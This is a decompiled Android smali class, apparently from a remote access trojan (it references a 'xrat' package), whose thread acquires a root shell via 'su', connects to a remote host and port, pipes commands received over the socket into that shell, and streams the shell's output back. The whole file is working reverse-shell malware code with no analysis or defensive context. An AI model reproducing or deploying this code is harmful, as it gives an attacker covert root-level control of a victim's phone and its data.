.class final Lcom/v1/l;
.super Ljava/lang/Thread;


# instance fields
.field final synthetic a:Lcom/v1/StreamService;

.field private b:S


# direct methods
.method public constructor <init>(Lcom/v1/StreamService;S)V
    .locals 0

    iput-object p1, p0, Lcom/v1/l;->a:Lcom/v1/StreamService;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    iput-short p2, p0, Lcom/v1/l;->b:S

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 9

    const/4 v2, 0x0

    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    iget-object v1, p0, Lcom/v1/l;->a:Lcom/v1/StreamService;

    const-string v3, "su"

    invoke-virtual {v0, v3}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v0

    iput-object v0, v1, Lcom/v1/StreamService;->f:Ljava/lang/Process;

    new-instance v1, Ljava/net/Socket;

    iget-object v0, p0, Lcom/v1/l;->a:Lcom/v1/StreamService;

    iget-object v0, v0, Lcom/v1/StreamService;->a:Ljava/lang/String;

    iget-object v3, p0, Lcom/v1/l;->a:Lcom/v1/StreamService;

    iget v3, v3, Lcom/v1/StreamService;->b:I

    invoke-direct {v1, v0, v3}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V
    :try_end_0
    .catch Ljava/net/ConnectException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    :try_start_1
    new-instance v4, Ljava/io/DataOutputStream;

    invoke-virtual {v1}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v0

    invoke-direct {v4, v0}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V
    :try_end_1
    .catch Ljava/net/ConnectException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_3

    :try_start_2
    new-instance v3, Ljava/io/DataInputStream;

    invoke-virtual {v1}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v0

    invoke-direct {v3, v0}, Ljava/io/DataInputStream;-><init>(Ljava/io/InputStream;)V
    :try_end_2
    .catch Ljava/net/ConnectException; {:try_start_2 .. :try_end_2} :catch_0
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_4

    const/16 v0, 0xdf

    :try_start_3
    invoke-static {v0}, Lcom/google/xrat/a/b;->a(S)[B

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/io/DataOutputStream;->write([B)V

    iget-short v0, p0, Lcom/v1/l;->b:S

    invoke-static {v0}, Lcom/google/xrat/a/b;->a(S)[B

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/io/DataOutputStream;->write([B)V

    const/4 v0, 0x1

    invoke-static {v0}, Lcom/google/xrat/a/b;->a(S)[B

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/io/DataOutputStream;->write([B)V

    iget-object v0, p0, Lcom/v1/l;->a:Lcom/v1/StreamService;

    iget-object v0, v0, Lcom/v1/StreamService;->f:Ljava/lang/Process;

    invoke-virtual {v0}, Ljava/lang/Process;->getErrorStream()Ljava/io/InputStream;

    move-result-object v0

    iget-object v2, p0, Lcom/v1/l;->a:Lcom/v1/StreamService;

    iget-object v2, v2, Lcom/v1/StreamService;->f:Ljava/lang/Process;

    invoke-virtual {v2}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;

    move-result-object v2

    iget-object v5, p0, Lcom/v1/l;->a:Lcom/v1/StreamService;

    iget-object v5, v5, Lcom/v1/StreamService;->f:Ljava/lang/Process;

    invoke-virtual {v5}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v5

    :goto_0
    new-instance v6, Ljava/lang/StringBuffer;

    invoke-direct {v6}, Ljava/lang/StringBuffer;-><init>()V

    invoke-virtual {v3}, Ljava/io/DataInputStream;->readUTF()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/String;->getBytes()[B

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/io/OutputStream;->write([B)V

    const-string v6, "\n"

    invoke-virtual {v6}, Ljava/lang/String;->getBytes()[B

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/io/OutputStream;->write([B)V

    invoke-virtual {v5}, Ljava/io/OutputStream;->flush()V

    new-instance v6, Ljava/lang/Thread;

    new-instance v7, Lcom/v1/k;

    iget-object v8, p0, Lcom/v1/l;->a:Lcom/v1/StreamService;

    invoke-direct {v7, v8, v0, v4}, Lcom/v1/k;-><init>(Lcom/v1/StreamService;Ljava/io/InputStream;Ljava/io/DataOutputStream;)V

    invoke-direct {v6, v7}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v6}, Ljava/lang/Thread;->start()V

    new-instance v6, Ljava/lang/Thread;

    new-instance v7, Lcom/v1/k;

    iget-object v8, p0, Lcom/v1/l;->a:Lcom/v1/StreamService;

    invoke-direct {v7, v8, v2, v4}, Lcom/v1/k;-><init>(Lcom/v1/StreamService;Ljava/io/InputStream;Ljava/io/DataOutputStream;)V

    invoke-direct {v6, v7}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v6}, Ljava/lang/Thread;->start()V
    :try_end_3
    .catch Ljava/net/ConnectException; {:try_start_3 .. :try_end_3} :catch_0
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_5

    goto :goto_0

    :catch_0
    move-exception v0

    :goto_1
    return-void

    :catch_1
    move-exception v0

    move-object v1, v2

    move-object v3, v2

    :goto_2
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    :try_start_4
    const-string v0, "over"

    invoke-virtual {v3, v0}, Ljava/io/DataOutputStream;->writeUTF(Ljava/lang/String;)V

    iget-object v0, p0, Lcom/v1/l;->a:Lcom/v1/StreamService;

    iget-object v0, v0, Lcom/v1/StreamService;->f:Ljava/lang/Process;

    invoke-virtual {v0}, Ljava/lang/Process;->destroy()V

    invoke-virtual {v3}, Ljava/io/DataOutputStream;->close()V

    invoke-virtual {v2}, Ljava/io/DataInputStream;->close()V

    invoke-virtual {v1}, Ljava/net/Socket;->close()V
    :try_end_4
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_2

    goto :goto_1

    :catch_2
    move-exception v0

    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1

    :catch_3
    move-exception v0

    move-object v3, v2

    goto :goto_2

    :catch_4
    move-exception v0

    move-object v3, v4

    goto :goto_2

    :catch_5
    move-exception v0

    move-object v2, v3

    move-object v3, v4

    goto :goto_2
.end method
